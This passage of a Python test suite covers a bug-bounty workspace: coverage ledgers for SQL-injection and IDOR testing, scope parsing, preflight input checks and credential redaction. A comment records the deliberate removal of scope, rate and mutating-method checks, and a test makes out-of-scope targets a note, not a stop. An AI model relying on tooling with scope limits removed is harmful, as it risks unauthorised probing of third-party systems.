            self._run(d, phase="13-api", selector="api.acme.com", status="running")
            self._run(d, finish="R-001", status="partial", resume_from="openapi parsed")
            latest = {r["run_id"]: r for r in kb.read_runs(d)}
            self.assertEqual(len(latest), 1)
            self.assertEqual(latest["R-001"]["status"], "partial")
            self.assertEqual(latest["R-001"]["resume_from"], "openapi parsed")
            self.assertEqual(latest["R-001"]["phase"], "13-api")   # carried from the open row

    def test_opening_a_run_requires_phase_and_selector(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp)
            with self.assertRaises(SystemExit):
                self._run(d, status="running")

    def test_scope_hash_is_recorded_and_changes_with_the_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp)
            self._run(d, phase="03", selector="*.acme.com", status="running")
            before = kb.read_runs(d)[-1]["scope_sha"]
            self.assertTrue(before)
            (d / "scope.md").write_text("### In scope\n- `*.acme.com`\n- `*.other.com`\n")
            self.assertNotEqual(kb.scope_sha(d), before)

    def test_standing_decisions_live_in_the_file_tools_reconcile_against(self):
        """A constraint in a ledger nobody loads is a constraint that gets violated."""
        s = (ROOT / "targets" / "_template" / "scope.md").read_text()
        self.assertIn("Standing decisions", s)
        self.assertIn("Constraints", s)
        self.assertIn("Interpretations", s)

    def test_the_exit_contract_opens_before_it_runs(self):
        t = (ROOT / "playbooks" / "system" / "orchestrator.md").read_text()
        self.assertIn("--status running", t)
        # The invariant is ordering, not formatting: the run is opened BEFORE the work, so an
        # interrupted session leaves a trace instead of nothing. The old assertion checked an
        # ASCII command-sequence block that the orchestrator no longer carries.
        self.assertLess(t.index("--status running"), t.index("**Persist.**"),
                        "the run must be opened before the work, not after")



class TestedLedgerIdentityTests(unittest.TestCase):
    """The ledger promises 'this is what remains untested'. Its key has to support that."""

    HEAD = ("| date | entrypoint | variant | class | principal | method | result | coverage "
            "| fix_locus | artifact_ptr |\n" + "|---" * 10 + "|\n")

    def _brain(self, root, rows, principals="user-a, user-b"):
        d = Path(root) / "t"
        (d / "recon").mkdir(parents=True)
        (d / "index.md").write_text("# t\n")
        (d / "scope.md").write_text("### In scope\n- `*.acme.com`\n")
        (d / "attack-surface.md").write_text(
            "| rank | entrypoint | vuln_class | principal | properties | score |\n"
            + "|---" * 6 + "|\n"
            + f"| 1 | POST /api/search | sql-injection | {principals} | db-query | 12 |\n")
        (d / "tested.md").write_text(self.HEAD + rows)
        return d

    def _load(self, d):
        import io, contextlib
        with contextlib.redirect_stdout(io.StringIO()) as buf:
            logged = cov.load_tested(d)
        return logged, buf.getvalue()

    def test_variant_makes_two_inputs_two_cells(self):
        """`q` tested says nothing about `filters[name]`."""
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp,
                "| 2026-07-01 | POST /api/search | q | sql-injection | user-a | boolean | "
                "not-vuln | tested | — | raw/a.txt |\n"
                "| 2026-07-02 | POST /api/search | filters[name] | sql-injection | user-a | "
                "boolean | not-vuln | tested | — | raw/b.txt |\n")
            logged, _ = self._load(d)
            keys = logged["post /api/search"]["sql-injection"]
            self.assertEqual(len(keys), 2, "two variants collapsed into one cell")

    def test_an_unevidenced_negative_cannot_clear_a_cell(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp,
                "| 2026-07-01 | POST /api/search | q | sql-injection | user-a | | "
                "not-vuln | tested | — | |\n")
            logged, out = self._load(d)
            self.assertEqual(list(logged["post /api/search"]["sql-injection"].values()), ["partial"])
            self.assertIn("DOWNGRADED", out)

    def test_an_evidenced_negative_does_clear_it(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp,
                "| 2026-07-01 | POST /api/search | q | sql-injection | user-a | boolean | "
                "not-vuln | tested | — | raw/a.txt |\n")
            logged, _ = self._load(d)
            self.assertEqual(list(logged["post /api/search"]["sql-injection"].values()), ["tested"])

    def test_a_variantless_row_is_reported_as_coarse(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp,
                "| 2026-07-01 | POST /api/search | | sql-injection | user-a | boolean | "
                "not-vuln | tested | — | raw/a.txt |\n")
            _, out = self._load(d)
            self.assertIn("WITHOUT naming a variant", out)

    def test_conflicting_rows_are_reported_not_silently_overwritten(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = self._brain(tmp,
                "| 2026-07-01 | POST /api/search | q | sql-injection | user-a | boolean | "
                "not-vuln | tested | — | raw/a.txt |\n"
                "| 2026-07-02 | POST /api/search | q | sql-injection | user-a | | "
                "inconclusive | partial | — | |\n")
            _, out = self._load(d)
            self.assertIn("conflicting rows", out)

    def test_one_partial_variant_keeps_the_principal_unfinished(self):
        logged = {"sql-injection": {("user-a", "q"): "tested", ("user-a", "sort"): "partial"}}
        states = cov.cell_states({("sql-injection", "user-a", "")}, logged)
        self.assertEqual(states[("sql-injection", "user-a", "")], "partial")

    def test_fix_locus_is_documented_as_finding_dedup_not_coverage(self):
        t = (ROOT / "targets" / "_template" / "tested.md").read_text()
        self.assertIn("dedup key for FINDINGS, not for coverage", t)


class BlockedIsNotProbedTests(unittest.TestCase):
    def test_a_blocked_host_is_not_treated_as_probed(self):
        """It hid the host from pivot candidates — exactly backwards."""
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "t"; d.mkdir()
            (d / "tested.md").write_text(
                "| date | entrypoint | class | principal | result | coverage |\n" + "|---" * 6 + "|\n"
                "| 2026-07-01 | GET https://never.acme.com/x | idor-bola | user-a | | "
                "blocked (needs-account) |\n"
                "| 2026-07-02 | GET https://real.acme.com/y | idor-bola | user-a | not-vuln | "
                "tested |\n")
            probed = kb.tested_subjects(d)
            self.assertIn("real.acme.com", probed)
            self.assertNotIn("never.acme.com", probed)



class InvisibleCharacterTests(unittest.TestCase):
    """An invisible character silently turned an exclusion heading into prose — widening scope."""

    def _scope(self, body):
        d = Path(tempfile.mkdtemp()) / "t"; d.mkdir()
        (d / "scope.md").write_text(body)
        return d

    def test_no_invisible_character_can_hide_an_exclusion(self):
        for name, ch in (("BOM", "\ufeff"), ("NBSP", "\u00a0"), ("ZWSP", "\u200b"),
                         ("narrow NBSP", "\u202f"), ("word joiner", "\u2060")):
            d = self._scope(f"### In scope\n- `*.acme.com`\n\n{ch}### Out of scope\n"
                            f"- `admin.acme.com`\n")
            s = scopelib.parse_scope(d)
            self.assertFalse(scopelib.in_scope("admin.acme.com", s),
                             f"{name} hid the exclusion — scope silently widened")

    def test_markdown_permits_up_to_three_leading_spaces_on_a_heading(self):
        for indent in ("", " ", "  ", "   "):
            d = self._scope(f"### In scope\n- `*.acme.com`\n\n{indent}### Out of scope\n"
                            f"- `admin.acme.com`\n")
            s = scopelib.parse_scope(d)
            self.assertFalse(scopelib.in_scope("admin.acme.com", s),
                             f"{len(indent)}-space indent hid the exclusion")

    def test_a_bom_does_not_hide_the_first_table_row(self):
        self.assertEqual(len(kb.table_rows("\ufeff| a | b |\n|---|---|\n| 1 | x.acme.com |\n")), 1)


class BackwardsCompatibilityTests(unittest.TestCase):
    """Files written before this session's schema changes must still read."""

    def test_a_pre_resume_runs_tsv_still_parses(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "t"; d.mkdir()
            (d / "index.md").write_text("# t\n")
            (d / "runs.tsv").write_text(
                "run_id\tdate\tphase\tselector\tsources\tbudget\tstatus\tresult"
                "\toutput_ptr\tlimitations\n"
                "R-001\t2026-07-01\t03\t*.acme.com\tsubfinder\t\tcomplete-for-this-run"
                "\t12\t\tpassive\n")
            rows = kb.read_runs(d)
            self.assertEqual(len(rows), 1)
            self.assertEqual(rows[0]["resume_from"], "")

    def test_a_pre_variant_tested_md_is_explained_not_blamed(self):
        import io, contextlib
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "t"; d.mkdir()
            (d / "index.md").write_text("# t\n")
            (d / "tested.md").write_text(
                "| date | entrypoint | class | principal | result | coverage |\n" + "|---" * 6
                + "|\n| 2026-07-01 | POST /x | sql-injection | user-a | not-vuln | tested |\n")
            with contextlib.redirect_stdout(io.StringIO()) as buf:
                cov.load_tested(d)
            self.assertIn("predates the evidence columns", buf.getvalue())
            self.assertNotIn("DOWNGRADED", buf.getvalue())


class CrossToolAgreementTests(unittest.TestCase):
    def test_brief_and_dashboard_count_principals_identically(self):
        txt = ("| label | role | password | status |\n|---|---|---|---|\n"
               "| user-a | std | hunter2 | ready |\n| user-b | std | <set> | ready |\n")
        self.assertEqual(dash.usable_principals(txt), 1)
        rows = brief.account_rows(txt)
        ready = sum(1 for r in rows
                    if r.get("status", "").strip().lower() == "ready"
                    and brief.is_resolvable_reference(r.get("password", "")))
        self.assertEqual(ready, 1, "brief.py and dashboard.py disagree on usable principals")



class PlannedVariantTests(unittest.TestCase):
    """Coverage could see logged variants but not the ones nobody planned."""

    def _ep(self, variants):
        return {"proposed": {"sql-injection"}, "implied": set(), "props": set(),
                "principals": {"sql-injection": {"user-a"}},
                "variants": {"sql-injection": set(variants)} if variants else {}}

    def test_each_planned_variant_is_its_own_cell(self):
        cells = cov.expected_cells(self._ep({"q", "sort", "body.filters[name]"}))
        self.assertEqual(len(cells), 3)
        self.assertIn(("sql-injection", "user-a", "sort"), cells)

    def test_resolving_one_variant_does_not_resolve_the_class(self):
        expected = cov.expected_cells(self._ep({"q", "sort"}))
        logged = {"sql-injection": {("user-a", "q"): "tested"}}
        states = cov.cell_states(expected, logged)
        self.assertEqual(states[("sql-injection", "user-a", "q")], "tested")
        self.assertIsNone(states[("sql-injection", "user-a", "sort")],
                          "an untested variant was silently resolved")

    def test_no_planned_variant_yields_one_coarse_cell(self):
        cells = cov.expected_cells(self._ep(None))
        self.assertEqual(cells, {("sql-injection", "user-a", "")})

    def test_a_coarse_cell_is_satisfied_by_any_variant(self):
        states = cov.cell_states({("sql-injection", "user-a", "")},
                                 {"sql-injection": {("user-a", "q"): "tested"}})
        self.assertEqual(states[("sql-injection", "user-a", "")], "tested")

    def test_the_plan_template_declares_variants(self):
        t = (ROOT / "targets" / "_template" / "attack-surface.md").read_text()
        self.assertIn("| variants |", t.replace(" |", " |"))

    def test_schema_and_template_agree_on_the_tested_row(self):
        """Three files described this table differently."""
        schema = (ROOT / "playbooks" / "system" / "target-schema.md").read_text()
        tmpl = (ROOT / "targets" / "_template" / "tested.md").read_text()
        for col in ("variant", "fix_locus", "artifact_ptr", "coverage", "result"):
            self.assertIn(col, schema, f"target-schema.md omits {col}")
            self.assertIn(col, tmpl, f"tested.md template omits {col}")
        self.assertNotIn("| tenant |", schema, "schema still declares a column the template lacks")



pre = load_tool("preflight")
rl = load_tool("runlog")
init = None
try:
    import importlib.util as _i
    _s = _i.spec_from_file_location("init_t", ROOT / "tools" / "init-target.py")
    init = _i.module_from_spec(_s); _s.loader.exec_module(init)
except Exception:
    pass


class PreflightTests(unittest.TestCase):
    """A phase that runs without its input reports a zero it cannot justify."""

    def _t(self, root, **files):
        d = Path(root) / "t"; (d / "recon").mkdir(parents=True)
        (d / "index.md").write_text("# t\n")
        (d / "scope.md").write_text("### In scope\n- `*.acme.com`\n")
        (d / "accounts.md").write_text("")
        for rel, body in files.items():
            f = d / rel; f.parent.mkdir(parents=True, exist_ok=True); f.write_text(body)
        return d

    def test_declared_inputs_are_parsed_from_the_skill_itself(self):
        text = ("## Inputs\n- `@hosts.all` (from `subdomain-enumeration`).\n"
                "- `@net.ports` if `port-and-service-discovery` ran.\n- `@scope`.\n")
        got = {role: req for role, _path, req, _grp in pre.declared_inputs(text)}
        self.assertTrue(got["@hosts.all"], "primary input must be required")
        self.assertFalse(got["@net.ports"], "an 'if X ran' bullet is advisory")

    def test_a_missing_input_names_the_skill_that_produces_it(self):
        """The whole value: a dead end becomes a next step."""
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp)
            sf = ROOT / "skills" / "derive-properties.md"
            _, missing, _, _ = pre.check(d, sf)
            self.assertTrue(missing, "an empty brain must report missing inputs")
            producers = {row[3] for row in missing}
            self.assertTrue(any(p and "probing" in p for p in producers),
                            f"should name a producing skill, got {producers}")

    def test_an_any_of_group_is_satisfied_by_one_member(self):
        """derive-properties works from whichever artifacts exist; requiring all seven
        would report blockers on a skill that can run right now."""
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp, **{"recon/live-hosts.txt": "https://a.acme.com\n"})
            sf = ROOT / "skills" / "derive-properties.md"
            _, missing, optional, _ = pre.check(d, sf)
            self.assertEqual([], [m for m in missing if m[1] is not None],
                             "one present member should satisfy the whole any-of group")
            self.assertTrue(optional, "the absent members stay visible as advisories")

    def test_a_prompt_subject_skill_is_not_unconditionally_ready(self):
        """vuln-hunt/analyse-request take their subject from the message, not the brain. Reporting
        'Ready to run' with nothing supplied defeats a deterministic input check for a weak model.
        Unconfirmed -> prompt_needed (and exit 1); --provided -> present (and exit 0)."""
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp)
            sf = ROOT / "skills" / "analyse-request.md"
            present, missing, _optional, prompt = pre.check(d, sf)
            self.assertTrue(prompt, "an unconfirmed @hunter.* subject must land in prompt_needed")
            self.assertFalse(any(r[0].startswith("@hunter.") for r in present),
                             "it must NOT be counted present until confirmed")
            # confirming it moves it to present
            role = prompt[0][0]
            present2, _m, _o, prompt2 = pre.check(d, sf, provided=[role])
            self.assertFalse(prompt2, "--provided should clear the prompt requirement")
            self.assertTrue(any(r[0] == role for r in present2))

    def test_prompt_subject_satisfies_an_any_of_input_group(self):
        """A hunter-named host must not require the whole recon pipeline first."""
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp)
            sf = ROOT / "skills" / "url-collection.md"
            present, missing, optional, prompt = pre.check(
                d, sf, provided=["@hunter.host"])
            self.assertFalse(missing)
            self.assertFalse(prompt)
            self.assertTrue(any(r[0] == "@hunter.host" for r in present))
            self.assertTrue(any(r[0] == "@hosts.live" for r in optional))

    def test_file_input_satisfies_any_of_group_without_prompt_subject(self):
        """A multi-host run must not ask for a redundant hunter-named host."""
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp, **{"recon/live-hosts.txt": "https://a.acme.com\n"})
            sf = ROOT / "skills" / "url-collection.md"
            _present, missing, _optional, prompt = pre.check(d, sf)
            self.assertFalse(missing)
            self.assertFalse(prompt)

    def test_enumerated_subdomains_satisfy_url_collection_selector(self):
        """Archive collection can cover enumerated names before every name is HTTP-live."""
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp, **{"recon/subdomains.txt": "a.acme.com\nb.acme.com\n"})
            sf = ROOT / "skills" / "url-collection.md"
            present, missing, optional, prompt = pre.check(d, sf)
            self.assertFalse(missing)
            self.assertFalse(prompt)
            self.assertTrue(any(r[0] == "@hosts.all" for r in present))
            self.assertTrue(any(r[0] == "@hosts.live" for r in optional))

    def test_host_or_set_skills_accept_one_exact_host_without_estate_recon(self):
        host_or_set = (
            "api-discovery", "application-mapping", "authentication-surface-mapping",
            "component-inventory", "content-discovery", "dns-analysis", "http-probing",
            "javascript-analysis", "live-host-validation", "subdomain-takeover",
            "technology-fingerprinting", "url-collection",
        )
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp)
            for slug in host_or_set:
                with self.subTest(skill=slug):
                    present, missing, _optional, prompt = pre.check(
                        d, ROOT / "skills" / f"{slug}.md", provided=["@hunter.host"])
                    self.assertFalse(missing)
                    self.assertFalse(prompt)
                    self.assertTrue(any(row[0] == "@hunter.host" for row in present))

    def test_host_or_set_selector_groups_do_not_absorb_enrichment(self):
        expected = {
            "api-discovery": {"@hunter.host", "@hosts.live"},
            "application-mapping": {"@hunter.host", "@hosts.live"},
            "authentication-surface-mapping": {"@hunter.host", "@hosts.live"},
            "component-inventory": {"@hunter.host", "@hosts.live"},
            "content-discovery": {"@hunter.host", "@hosts.live"},
            "dns-analysis": {"@hunter.host", "@hosts.all", "@roots"},
            "http-probing": {"@hunter.host", "@hosts.resolved", "@hosts.all"},
            "javascript-analysis": {"@hunter.host", "@hosts.live"},
            "live-host-validation": {"@hunter.host", "@hosts.all"},
            "parameter-discovery": {"@hunter.entrypoint", "@urls", "@hosts.live"},
            "subdomain-takeover": {"@hunter.host", "@net.dns"},
            "technology-fingerprinting": {"@hunter.host", "@hosts.live"},
            "url-collection": {"@hunter.host", "@hosts.all", "@hosts.live"},
        }
        for slug, wanted in expected.items():
            with self.subTest(skill=slug):
                declared = pre.declared_inputs(
                    (ROOT / "skills" / f"{slug}.md").read_text(encoding="utf-8"))
                grouped = {role for role, _path, _required, in_group in declared if in_group}
                self.assertEqual(wanted, grouped)

    def test_host_or_set_skills_still_accept_their_multi_host_artifact(self):
        host_sets = {
            "api-discovery": ("recon/live-hosts.txt", "https://a.acme.com\n"),
            "application-mapping": ("recon/live-hosts.txt", "https://a.acme.com\n"),
            "authentication-surface-mapping": ("recon/live-hosts.txt", "https://a.acme.com\n"),
            "component-inventory": ("recon/live-hosts.txt", "https://a.acme.com\n"),
            "content-discovery": ("recon/live-hosts.txt", "https://a.acme.com\n"),
            "dns-analysis": ("recon/subdomains.txt", "a.acme.com\nb.acme.com\n"),
            "http-probing": ("recon/resolved.txt", "a.acme.com 192.0.2.1\n"),
            "javascript-analysis": ("recon/live-hosts.txt", "https://a.acme.com\n"),
            "live-host-validation": ("recon/subdomains.txt", "a.acme.com\nb.acme.com\n"),
            "subdomain-takeover": (
                "recon/dns.md",
                "| host | record | value | chain | takeover_candidate | notes | source |\n"
                "|---|---|---|---|---|---|---|\n"
                "| a.acme.com | CNAME | missing.vendor.test | vendor | yes | dangling | run |\n",
            ),
            "technology-fingerprinting": ("recon/live-hosts.txt", "https://a.acme.com\n"),
            "url-collection": ("recon/subdomains.txt", "a.acme.com\nb.acme.com\n"),
        }
        with tempfile.TemporaryDirectory() as tmp:
            for slug, (path, contents) in host_sets.items():
                with self.subTest(skill=slug):
                    d = self._t(Path(tmp) / slug, **{path: contents})
                    _present, missing, _optional, prompt = pre.check(
                        d, ROOT / "skills" / f"{slug}.md")
                    self.assertFalse(missing)
                    self.assertFalse(prompt)

    def test_cli_reports_prompt_check_required_and_exits_nonzero(self):
        import subprocess
        with tempfile.TemporaryDirectory() as tmp:
            d = self._t(tmp)
            r = subprocess.run([sys.executable, str(ROOT / "tools" / "preflight.py"),
                                str(d), "analyse-request"], capture_output=True, text=True)
            self.assertEqual(1, r.returncode, r.stdout + r.stderr)
            self.assertIn("PROMPT-CHECK REQUIRED", r.stdout)
            self.assertNotIn("Ready to run", r.stdout)
            # and with --provided it clears
            role = "@hunter.request"
            r2 = subprocess.run([sys.executable, str(ROOT / "tools" / "preflight.py"),
                                 str(d), "analyse-request", "--provided", role],
                                capture_output=True, text=True)
            self.assertEqual(0, r2.returncode, r2.stdout + r2.stderr)
            self.assertIn("Ready to run", r2.stdout)

    def test_nothing_is_a_gate_except_inputs(self):
        """Scope, calibration, principals and fan-out budget are no longer checked here.
        The hunter chose the skill; this tool reports what it has to work with."""
        text = (ROOT / "tools" / "preflight.py").read_text(encoding="utf-8")
        # Check the CODE, not the prose: the docstring names these deliberately, to record
        # what was removed and why.
        code = "\n".join(ln for ln in text.splitlines()
                         if not ln.lstrip().startswith("#")).split('"""')[-1]
        for gone in ("usable_principals", "calibration_of", "vps_probe", "parse_scope"):
            self.assertNotIn(gone, code, f"{gone} should no longer gate a run")


class RunLogTests(unittest.TestCase):
    """A failure nobody mentioned must still be on the record."""

    def test_credentials_are_redacted_in_every_form(self):
        import sys as _s
        old = _s.argv
        try:
            for argv, secret in ((["--header", "X-BB: SECRET1"], "SECRET1"),
                                 (["--token=SECRET2"], "SECRET2"),
                                 (["--api-key=SECRET3"], "SECRET3")):
                _s.argv = ["x", "t"] + argv
                self.assertNotIn(secret, rl._redact(argv), f"{argv[0]} leaked")
        finally:
            _s.argv = old

    def test_benign_flags_survive(self):
        self.assertIn("45", rl._redact(["--rate", "45"]))

    def test_recording_never_raises(self):
        rl.record(None, "t.py", 0)
        rl.record("/nonexistent/path", "t.py", 2, "x")

    def test_a_nonzero_exit_is_written(self):
        with tempfile.TemporaryDirectory() as tmp:
            d = Path(tmp) / "t"; d.mkdir(); (d / "index.md").write_text("# t\n")
            rl.record(d, "coverage.py", 2, "schema drift")
            rows = rl.read_log(d)
            self.assertEqual(rows[-1]["exit"], "2")

    def test_help_is_not_recorded_as_target_work(self):
        from unittest import mock
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / "t"
            target.mkdir()
            (target / "index.md").write_text("# t\n")

            @rl.wrap()
            def help_command():
                return 0

            with mock.patch.object(sys, "argv", ["tool.py", str(target), "js", "--help"]):
                self.assertEqual(0, help_command())
            self.assertEqual([], rl.read_log(target))


@unittest.skipIf(init is None, "init-target.py not importable")
class InitTargetTests(unittest.TestCase):
    def test_scope_shape_drives_the_entry_point(self):
        # Slugs, not numbers. Numeric identity is what drifted: a renumbering silently
        # invalidated every cross-reference, and a suggested entry point pointing at a phase
        # number nobody could resolve is the same failure aimed at a brand-new target.
        for scope, entry in (("*.acme.com", "subdomain-enumeration"),
                             ("10.0.0.0/24", "asn-and-ip-discovery"),
                             ("app.acme.com", "http-probing"),
                             ("Globex Corporation everything owned", "organization-and-roots")):
            self.assertEqual(init.classify(scope)[1], entry, scope)

    def test_every_suggested_entry_point_is_a_real_skill(self):
        """A scaffold that suggests a skill which does not exist strands a new target."""
        for scope in ("*.acme.com", "10.0.0.0/24", "app.acme.com", "Globex Corporation"):
            entry = init.classify(scope)[1]
            for slug in (s.strip() for s in entry.split("/")):
                self.assertTrue((ROOT / "skills" / f"{slug}.md").exists(),
                                f"{scope} suggests '{slug}', which is not a skill")

    def test_every_schema_file_is_required_before_the_rename(self):
        for f in ("scope.md", "index.md", "tested.md", "runs.tsv", "observations.tsv"):
            self.assertIn(f, init.REQUIRED)

    def test_slugify_refuses_an_empty_result(self):
        with self.assertRaises(SystemExit):
            init.slugify("!!!")


# ─────────────────────────────────────────────────────────────────────────────
# REMOVED: 40 tests of run.py's policy engine — scope-in-command, run-ledger
# agreement, rate normalisation, mutating methods, calibrated filters, flag
# advertisement, output containment, vhost fuzzing bounds.
#
# They were good tests of code that never executed. `logs/exec/` held ZERO
# records for an entire engagement: the VPS has no checkout of this repo, so
# every real command went through a hand-rolled script and none of the checking
# applied. Meanwhile the checks encoded judgements that belong to the hunter —
# which packets to send, from where, at what rate — and this workspace decided
# those are not the harness's to make.
#
# What replaced them is below: the recorder's contract. Redaction is still
# tested (RecordRedactionTests) because a secret reaching a durable record is a
# real harm, not a policy preference.
# ─────────────────────────────────────────────────────────────────────────────


class RecordRedactionTests(unittest.TestCase):
    """The execution record outlives the session; a secret in it outlives the engagement."""

    @classmethod
    def setUpClass(cls):
        cls.runmod = load_tool("run")

    def test_a_bearer_token_in_a_header_never_reaches_the_record(self):
        out = self.runmod.redact_argv(
            ["curl", "-H", "Authorization: Bearer sk-live-SECRET", "https://a.acme.com"])
        self.assertNotIn("sk-live-SECRET", " ".join(out))
        self.assertIn("curl", out)

    def test_the_equals_form_is_redacted(self):
        out = self.runmod.redact_argv(["tool", "--api-key=SECRET123"])
        self.assertNotIn("SECRET123", " ".join(out))

    def test_credentials_in_a_url_are_redacted_but_the_host_survives(self):
        out = self.runmod.redact_argv(["curl", "https://user:pw@a.acme.com/x"])
        self.assertNotIn("pw", " ".join(out))
        self.assertIn("a.acme.com", " ".join(out))

    def test_a_cookie_value_is_redacted_wherever_it_appears(self):
        out = self.runmod.redact_argv(["curl", "-b", "session=abc123", "https://a.acme.com"])
        self.assertNotIn("abc123", " ".join(out))

    def test_curl_credentials_are_redacted_but_an_httpx_url_is_not(self):
        # -u means credentials in curl and a URL in httpx/nuclei; only the value can say which
        creds = self.runmod.redact_argv(["curl", "-u", "admin:hunter2", "https://a.acme.com"])
        self.assertNotIn("hunter2", " ".join(creds))
        url = self.runmod.redact_argv(["httpx", "-u", "https://a.acme.com"])
        self.assertIn("https://a.acme.com", url)

    def test_an_ordinary_command_is_left_alone(self):
        argv = ["ffuf", "-u", "https://a.acme.com/FUZZ", "-fs", "2048"]
        self.assertEqual(argv, self.runmod.redact_argv(argv))


class PromptAsInputTests(unittest.TestCase):
    """A phase input the hunter supplied in the prompt is real — it just has to be written down.
    Before this, "run subdomain enum on acme, roots are acme.com and acme.net" was refused as a
    missing input while the input sat in the sentence that asked for it."""

    @classmethod
    def setUpClass(cls):
        cls.rec = load_tool("record")
        cls.scopelib = load_tool("scopelib")

    def brain(self, d, scope="- `*.acme.com`"):
        t = Path(d)
        (t / "index.md").write_text("# t\n", encoding="utf-8")
        (t / "scope.md").write_text(f"## In scope\n\n{scope}\n", encoding="utf-8")
        return t

    def run_rec(self, target, into, values, source="hunter, prompt"):
        import subprocess
        return subprocess.run(
            [sys.executable, str(ROOT / "tools" / "record.py"), str(target),
             "--into", into, "--source", source, "--"] + values,
            capture_output=True, text=True)

    def test_a_value_from_the_prompt_lands_in_the_file_with_its_source(self):
        with tempfile.TemporaryDirectory() as d:
            t = self.brain(d)
            r = self.run_rec(t, "recon/root-domains.md", ["acme.com"])
            body = (t / "recon/root-domains.md").read_text()
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertIn("acme.com", body)
        self.assertIn("hunter, prompt", body)      # provenance, or it is just a rumour

    def test_a_value_outside_scope_is_recorded_with_a_note_not_refused(self):
        """The contract: the hunter supplied it, so it is persisted. Vetoing a hunter-supplied
        input was the sharpest self-contradiction in the workspace — the tool meant to store the
        required input refused it. Now scope is context: outside the allowlist is a NOTE, not a
        stop, and the value lands in the file."""
        with tempfile.TemporaryDirectory() as d:
            t = self.brain(d)
            r = self.run_rec(t, "recon/root-domains.md", ["acme.com", "evil.test"])
            body = (t / "recon/root-domains.md").read_text()
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertIn("evil.test", body)                 # recorded, not dropped
        self.assertIn("acme.com", body)
        self.assertIn("scope.md", r.stdout)              # and the note fired (fail-loud)

    def test_recording_scope_itself_is_the_one_exception(self):
        with tempfile.TemporaryDirectory() as d:
            t = Path(d)
            (t / "index.md").write_text("# t\n", encoding="utf-8")
            (t / "scope.md").write_text(
                "## In scope\n\n- TBD — blocking: derive from the verbatim statement above; "
                "tools refuse until this is filled\n", encoding="utf-8")
            r = self.run_rec(t, "scope", ["*.acme.com"])
            parsed = self.scopelib.parse_scope(t)
        self.assertEqual(0, r.returncode, r.stderr)
        self.assertEqual("ok", parsed["state"])

    def test_a_value_already_present_is_not_duplicated(self):
        with tempfile.TemporaryDirectory() as d:
            t = self.brain(d)
            self.run_rec(t, "recon/root-domains.md", ["acme.com"])
            r = self.run_rec(t, "recon/root-domains.md", ["acme.com"])
            body = (t / "recon/root-domains.md").read_text()
        self.assertEqual(1, r.returncode)
        self.assertEqual(1, body.count("acme.com"))

    def test_an_output_escaping_the_target_is_refused(self):
        with tempfile.TemporaryDirectory() as d:
            r = self.run_rec(self.brain(d), "../escape.md", ["acme.com"])
        self.assertEqual(2, r.returncode)


class PathDerivationTests(unittest.TestCase):
    """The replay list is derived from endpoints.md, never maintained beside it."""

    @classmethod
    def setUpClass(cls):
        cls.paths = load_tool("paths")

    def test_object_ids_collapse_so_shared_routes_are_visible(self):
        # /orders/123 and /orders/456 are ONE route on two hosts — counting them as two routes on
        # one host each makes a cross-host tool report "nothing shared" on a cloned estate
        self.assertEqual("/api/v1/orders/{id}", self.paths.templatize("/api/v1/orders/123"))
        self.assertEqual("/u/{uuid}/x", self.paths.templatize(
            "/u/3f2504e0-4f89-11d3-9a0c-0305e82c3301/x"))
        self.assertEqual("/r/{date}", self.paths.templatize("/r/2026-08-01"))

    def test_a_real_route_segment_is_not_mistaken_for_an_id(self):
        self.assertEqual("/api/v1/orders", self.paths.templatize("/api/v1/orders"))
        self.assertEqual("/admin/export", self.paths.templatize("/admin/export"))

    def test_canonical_endpoint_rows_feed_path_derivation(self):
        with tempfile.TemporaryDirectory() as tmp:
            target = make_brain(tmp)
            surfacelib.append(target / "recon" / "endpoints.md", [
                surfacelib.Endpoint(
                    url="https://app.acme.com/api/orders/1837?expand=customer",
                    method="POST",
                )
            ])
            urls = self.paths.urls_from(target)
        self.assertEqual(
            [("https://app.acme.com/api/orders/1837?expand=customer", "POST")], urls)


class SurfaceNormalizationTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.surface = load_tool("surface")

    def test_jsluice_jsonl_keeps_unknown_method_and_extracts_params(self):
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "urls.jsonl"
            source.write_text(
                '{"url":"/api/orders?expand=customer","queryParams":["tenant_id"]}\n'
                '{"url":"/api/orders","method":"POST","bodyParams":{"note":"x"}}\n',
                encoding="utf-8",
            )
            endpoints = self.surface.js_endpoints(
                source, "https://app.acme.com", "https://app.acme.com/app.js")
        self.assertEqual(["UNKNOWN", "POST"], [endpoint.method for endpoint in endpoints])
        self.assertEqual(("expand", "tenant_id"), endpoints[0].params)
        self.assertEqual(("note",), endpoints[1].params)
        self.assertEqual("https://app.acme.com/api/orders", endpoints[0].url)

    def test_js_provenance_drops_userinfo_query_and_fragment(self):
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "urls.jsonl"
            source.write_text('{"url":"/api?q=secret","method":"GET"}\n', encoding="utf-8")
            endpoints = self.surface.js_endpoints(
                source, "https://app.acme.com", "https://user:pass@app.acme.com/app.js?token=x#f")
        self.assertEqual("https://app.acme.com/api", endpoints[0].url)
        self.assertEqual("js:https://app.acme.com/app.js", endpoints[0].source)
        self.assertEqual(("q",), endpoints[0].params)

    def test_jsluice_filename_preserves_per_bundle_provenance(self):
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "urls.jsonl"
            source.write_text(
                '{"url":"/api/a","method":"GET","type":"fetch",'
